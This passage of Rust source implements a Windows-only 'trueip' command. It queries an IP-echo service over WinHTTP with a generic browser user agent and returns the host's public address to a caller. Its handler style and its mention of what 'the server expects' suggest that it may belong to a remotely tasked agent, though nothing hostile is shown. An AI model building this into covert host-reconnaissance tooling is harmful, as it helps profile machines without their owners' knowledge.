    let (host, port) = match hostport.rfind(':') {
        Some(i) => (&hostport[..i], hostport[i + 1..].parse::<u16>().unwrap_or(if use_tls { 443 } else { 80 })),
        None    => (hostport, if use_tls { 443 } else { 80 }),
    };
    if host.is_empty() {
        return (String::new(), "trueip: bad URL — no host".into());
    }

    #[link(name = "winhttp")]
    extern "system" {
        fn WinHttpOpen(agent: *const u16, access: u32, proxy: *const u16, bypass: *const u16, flags: u32) -> *mut core::ffi::c_void;
        fn WinHttpConnect(session: *mut core::ffi::c_void, host: *const u16, port: u16, reserved: u32) -> *mut core::ffi::c_void;
        fn WinHttpOpenRequest(conn: *mut core::ffi::c_void, verb: *const u16, path: *const u16, ver: *const u16, ref_: *const u16, accept: *const u16, flags: u32) -> *mut core::ffi::c_void;
        fn WinHttpSendRequest(req: *mut core::ffi::c_void, hdrs: *const u16, hlen: u32, opt: *mut core::ffi::c_void, olen: u32, total: u32, ctx: usize) -> i32;
        fn WinHttpReceiveResponse(req: *mut core::ffi::c_void, reserved: *mut core::ffi::c_void) -> i32;
        fn WinHttpReadData(req: *mut core::ffi::c_void, buf: *mut u8, toread: u32, read: *mut u32) -> i32;
        fn WinHttpQueryHeaders(req: *mut core::ffi::c_void, info: u32, name: *const u16, buf: *mut core::ffi::c_void, blen: *mut u32, idx: *mut u32) -> i32;
        fn WinHttpCloseHandle(h: *mut core::ffi::c_void) -> i32;
    }

    const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;
    const FLAG_SECURE: u32 = 0x0080_0000;
    const WINHTTP_QUERY_STATUS_CODE: u32 = 19;
    const WINHTTP_QUERY_FLAG_NUMBER: u32 = 0x2000_0000;
    const WINHTTP_HEADER_NAME_BY_INDEX: u32 = 0xFFFF_FFFF;
    const WINHTTP_NO_OUTPUT_BUFFER: usize = 0;

    unsafe {
        let session = WinHttpOpen(wide("Mozilla/5.0").as_ptr(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            std::ptr::null(), std::ptr::null(), 0);
        if session.is_null() { return (String::new(), format!("WinHttpOpen err {}", winhttp_last_err())); }

        let conn = WinHttpConnect(session, wide(host).as_ptr(), port, 0);
        if conn.is_null() {
            WinHttpCloseHandle(session);
            return (String::new(), format!("connect '{}' failed (err {})", host, winhttp_last_err()));
        }

        let flags: u32 = if use_tls { FLAG_SECURE } else { 0 };
        let req = WinHttpOpenRequest(conn, wide("GET").as_ptr(), wide(path).as_ptr(),
            std::ptr::null(), std::ptr::null(), std::ptr::null(), flags);
        if req.is_null() {
            WinHttpCloseHandle(conn); WinHttpCloseHandle(session);
            return (String::new(), format!("OpenRequest err {}", winhttp_last_err()));
        }

        let sent = WinHttpSendRequest(req, std::ptr::null(), 0,
            std::ptr::null_mut(), 0, 0, WINHTTP_NO_OUTPUT_BUFFER);
        let mut out = String::new();
        let mut err = String::new();
        if sent != 0 && WinHttpReceiveResponse(req, std::ptr::null_mut()) != 0 {
            let mut status: u32 = 0;
            let mut sz: u32 = 4;
            WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX as *const u16,
                &mut status as *mut u32 as *mut core::ffi::c_void, &mut sz, std::ptr::null_mut());
            let mut body = Vec::with_capacity(256);
            let mut buf = [0u8; 512];
            loop {
                let mut got: u32 = 0;
                if WinHttpReadData(req, buf.as_mut_ptr(), buf.len() as u32, &mut got) == 0 || got == 0 { break; }
                body.extend_from_slice(&buf[..got as usize]);
                if body.len() > 4096 { break; }
            }
            let text = String::from_utf8_lossy(&body).trim().to_string();
            if status != 200 {
                err = format!("HTTP {} from {}", status, host);
            } else if text.parse::<std::net::IpAddr>().is_ok() {
                out = text; // bare IP — exactly what the server expects
            } else {
                // Some echoes wrap JSON ({"ip":"1.2.3.4"}) — best-effort extract.
                // Try the common patterns before giving up.
                if let Some(ip) = extract_ip_from_json(&text) {
                    if ip.parse::<std::net::IpAddr>().is_ok() { out = ip; }
                    else { err = format!("unexpected body '{}'", text); }
                } else {
                    err = format!("unexpected body '{}'", text);
                }
            }
        } else {
            err = format!("request failed (err {})", winhttp_last_err());
        }

        WinHttpCloseHandle(req);
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        if out.is_empty() { (String::new(), err) } else { (out, String::new()) }
    }
}

/// Best-effort IP extraction from JSON-ish echo responses.
/// Handles {"ip":"x.x.x.x"}, {"query":"x.x.x.x"}, ip="x.x.x.x" patterns.
#[cfg(target_os = "windows")]
fn extract_ip_from_json(text: &str) -> Option<String> {
    // Look for any of the common keys, then grab the quoted value after it.
    for key in &["\"ip\"", "\"query\"", "\"origin\"", "\"addr\""] {
        if let Some(pos) = text.find(key) {
            let after = &text[pos + key.len()..];
            // Skip : and whitespace
            let after = after.trim_start_matches(|c: char| c.is_whitespace() || c == ':');
            if after.starts_with('"') {
                let inner = &after[1..];
                if let Some(end) = inner.find('"') {
                    let cand = &inner[..end];
                    if cand.parse::<std::net::IpAddr>().is_ok() {
                        return Some(cand.to_string());
                    }
                }
            }
        }
    }
    None
}

#[cfg(target_os = "windows")]
fn winhttp_last_err() -> u32 {
    #[link(name = "kernel32")]
    extern "system" { fn GetLastError() -> u32; }
    unsafe { GetLastError() }
}

#[cfg(not(target_os = "windows"))]
pub fn trueip(args: &str) -> (String, String) {
    let raw = args.trim();
    let url = if raw.is_empty() { "https://api.ipify.org".to_string() } else { raw.to_string() };
    // Unix dev builds: plain std HTTPS isn't available without crates — be honest.
    let _ = url;
    (String::new(), "trueip: windows-only (winhttp)".into())
}
